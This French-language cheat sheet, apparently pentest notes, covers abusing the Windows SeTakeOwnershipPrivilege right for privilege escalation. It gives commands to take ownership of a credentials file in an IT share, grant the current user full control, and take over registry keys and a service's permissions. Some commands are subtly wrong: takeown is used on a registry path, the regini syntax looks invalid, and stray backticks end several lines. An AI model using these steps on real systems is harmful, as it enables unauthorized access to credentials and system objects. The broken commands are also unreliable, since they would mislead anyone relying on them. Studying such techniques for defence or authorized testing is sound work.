### Qu'est-ce que le droit "SeTakeOwnershipPrivilege" (Setakeownership) ?

Ce privilège permet à un utilisateur de s'approprier n'importe quel objet sécurisable sur le système. Cela inclut des objets dans Active Directory, des fichiers et dossiers NTFS, des clés de registre, des services et des processus.

---
### Activation du droit "SeTakeOwnershipPrivilege"

Si le droit est désactivé, il peut être activé en utilisant une fonction PowerShell personnalisée comme dans l'exemple ci-dessous :

```powershell
Import-Module .\Enable-Privilege.ps1  # Charge le module qui permet d'activer des privilèges 
Enable-Privilege 'SeTakeOwnershipPrivilege'  # Active le privilège SeTakeOwnership`
```

**Note**: `Enable-Privilege.ps1` : lien vers le .ps1 à rajouter

---
### S'approprier un fichier ou dossier

Pour prendre la propriété d'un fichier ou d'un dossier :

```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'  # Prend la propriété du fichier`
```

---
### Modifier les ACLs (Access Control Lists)

Une fois que vous êtes propriétaire de l'objet, vous pouvez également modifier ses ACLs :

```powershell
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name  # Obtient le nom de l'utilisateur actuel 
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant "$user:F"  # Attribue des droits d'accès complets au fichier`
```

---
### S'approprier et modifier les ACLs d'une clé de registre

```powershell
# Prendre la propriété de la clé de registre 
takeown /f 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\example'  
# Attribuer les droits d'accès complets 
regini /grant=administrators=f 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\example'`
```

---
### S'approprier un service

```powershell
# Utiliser sc.exe pour reconfigurer le service 
sc.exe sdset [Nom_du_service] D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)`
```

